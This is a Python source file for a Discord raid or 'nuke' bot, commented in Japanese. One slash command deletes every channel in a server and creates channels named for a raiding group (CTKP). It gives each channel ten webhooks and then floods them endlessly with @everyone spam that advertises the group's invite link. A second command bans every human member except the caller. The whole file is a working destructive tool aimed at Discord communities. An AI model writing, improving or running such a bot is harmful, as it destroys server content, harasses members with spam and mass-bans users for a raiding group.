import discord
from discord.ext import commands
import asyncio

# ボットトークンをここに直接記述
TOKEN = 'TOKEN記述してね'

# ボットの初期化
intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.members = True
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

# メッセージを永遠に送信するためのフラグ
sending_messages = False
created_channels = []  # 作成されたチャンネルのリスト
webhooks = []  # 作成されたウェブフックのリスト

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}!')
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} command(s)")
    except Exception as e:
        print(f"Failed to sync commands: {e}")

# スラッシュコマンドを定義
@bot.tree.command(name="start", description="すべてのチャンネルを削除して新しいチャンネルを10個作成し、各チャンネルに10個のウェブフックを設定します")
async def start(interaction: discord.Interaction):
    global sending_messages, created_channels, webhooks
    await interaction.response.send_message("すべてのチャンネルを削除し、新しいチャンネルを10個作成し、各チャンネルに10個のウェブフックを設定しています...")

    # すべてのチャンネル（テキストと音声）を削除
    for channel in interaction.guild.channels:
        try:
            await channel.delete()
            print(f'Deleted channel: {channel.name}')
            await asyncio.sleep(2)  # 2秒の遅延
        except Exception as e:
            print(f'Failed to delete channel: {channel.name}, Error: {e}')

    # 新しいテキストチャンネルを10個作成し、各チャンネルに10個のウェブフックを設定
    created_channels = []
    webhooks = []
    for i in range(10):  # チャンネルの数を10に設定
        try:
            new_channel = await interaction.guild.create_text_channel(f'荒らし共栄圏万歳-{i+1}')
            created_channels.append(new_channel)
            # 各チャンネルに10個のウェブフックを作成
            for j in range(10):
                webhook = await new_channel.create_webhook(name=f"Webhook-{j+1}")
                webhooks.append(webhook)
                print(f'Created new webhook: {webhook.name} in channel: {new_channel.name}')
            await asyncio.sleep(2)  # 2秒の遅延
        except Exception as e:
            print(f'Failed to create channel or webhook: {e}')

    # メッセージの連続送信を開始
    if webhooks:
        sending_messages = True
        await send_messages_forever(webhooks)

async def send_messages_forever(webhooks):
    """指定されたウェブフックリストの中からランダムに選んでメッセージを送信し続ける"""
    while sending_messages:
        tasks = [send_message(webhook) for webhook in webhooks]
        await asyncio.gather(*tasks)  # 複数のウェブフックで同時にメッセージを送信

async def send_message(webhook):
    """指定されたウェブフックを使ってメッセージを送信する"""
    try:
        message = '@everyone \nあなたのさばは荒らし共栄圏（CTKP）に負けました。Discord.gg/ctkp'
        await webhook.send(content=message, username='荒らし共栄圏Bot')
        print(f'Sent message using webhook: {webhook.name}')
    except Exception as e:
        print(f'Failed to send message using webhook: {e}')

# すべてのメンバーをBANするスラッシュコマンド
@bot.tree.command(name="ban", description="すべてのメンバーをBANします")
async def ban(interaction: discord.Interaction):
    await interaction.response.send_message("すべてのメンバーをBANしています...")
    for member in interaction.guild.members:
        if member != interaction.user and not member.bot:  # 自分自身とボットはBANしない
            try:
                await member.ban(reason="All members are being banned by the /ban command")
                print(f'Banned member: {member.name}')
            except Exception as e:
                print(f'Failed to ban member: {member.name}, Error: {e}')

# ボットの起動
bot.run(TOKEN)
